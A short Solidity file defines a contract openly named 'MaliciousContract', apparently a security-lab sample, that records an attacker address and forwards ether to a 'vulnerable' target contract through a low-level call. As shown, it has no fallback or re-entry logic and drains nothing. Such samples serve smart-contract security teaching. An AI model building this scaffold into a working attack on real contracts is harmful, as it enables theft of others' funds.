// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address public attacker;

    constructor(address _vulnerableScAddress) payable {
        vulnerableScAddress = payable(_vulnerableScAddress);
        attacker = msg.sender;
    }

    function attack() public payable {
        vulnerableScAddress.call{value: msg.value}("");
    }
}
